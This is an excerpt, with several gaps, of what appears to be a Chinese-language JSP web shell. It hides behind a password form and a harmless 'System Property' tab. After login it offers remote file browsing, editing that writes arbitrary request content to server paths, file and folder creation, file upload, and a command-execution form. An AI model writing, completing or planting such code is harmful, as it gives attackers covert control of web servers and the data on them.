...
String[] strSysProperty  = {"签 到","System Property"};
...
if(strAction!=null && strAction.equals("edit"))
{
	...
	sbEdit.append("<br><textarea name=content style='width:100%;height:370px'>");
	String line="";
...
{
	File f=new File(strPath);
	BufferedWriter bwrite=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));
	String strContent=request.getParameter("content");
	bwrite.write(strContent);
	bwrite.close();
}
...
if(strAction!=null && strAction.equals("exitConfirm"))
{
	session.removeAttribute("isRegister");
}
isRegister = session.getAttribute("isRegister") != null && session.getAttribute("isRegister").equals("isRegister");
String registerMenuId = "menu1";
String operationMenuId = "menu2";
if ( isRegister ) { 
	registerMenuId = "menu2";
	operationMenuId = "menu1";
%>
<li><a href="#" onClick="return expandcontent('menu1', this)" class="current" > <%=strFileManage[languageNo]%> </a></li>
<li><a href="#" onClick="return expandcontent('menu3', this)" theme="#EAEAFF"> <%=strCommand[languageNo]%> </a></li>
<li><a href="#" onClick="return expandcontent('menu4', this)" theme="#EAEAFF"> 签 退 </a></li>
<% } else { %>
<li><a href="#" onClick="return expandcontent('menu1', this)" class="current" > <%=strSysProperty[languageNo]%> </a></li>
<li><a href="#" theme="#EAEAFF"> 更多 </a></li>
<% } %>
...
<div id="<%=registerMenuId%>" class="tabcontent">
<form name="frmPassword" action="" method="post">
        口令：<input type="password" size="12" name="password" style="height:25px">
        <input type="hidden" name="action" value="passwordConfirm">
        <input type="submit" value="&nbsp;&nbsp;确&nbsp;&nbsp;认&nbsp;&nbsp;" style="height:25px" >
</form>
</div>
<div id="menu4" class="tabcontent">
<form name="frmExit" action="" method="post">
        请点击“签退”按钮签退！<input type="hidden" name="action" value="exitConfirm">
        <input style="height:30px" type="submit" value="&nbsp;&nbsp;签&nbsp;&nbsp;退&nbsp;&nbsp;">
</form>
</div>
<div id="<%=operationMenuId%>" class="tabcontent">
<%
out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"+strCurrentFolder[languageNo]+"： <b>"+strDir+"</b></td><td>" + getDrivers() + "</td></tr></table>\r\n");
%>
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
	...
	<input type="submit" name="btnNewFile" value="新建文件" onClick="frmMake.submit()" style="height:25px"> 
	<input type="submit" name="btnNewDir" value="新建目录"  onclick="frmMake.submit()" style="height:25px"> 
	</form>		
	...
	<input type="hidden" name="tabID" value="1">
	<input type="hidden" name="content" value="">
	<input type="file" name="cqqUploadFile" size="36"  style="height:25px">
	<input type="submit" name="submit" value="&nbsp;上&nbsp;传&nbsp;"  style="height:25px">
	</td></tr></form>
      </table>
</div>
...
<input type="hidden" name="tabID" value="2">
<input type=submit name=submit value="&nbsp;<%=strExecute[languageNo]%>&nbsp;" style="height:25px">
</form>
<%
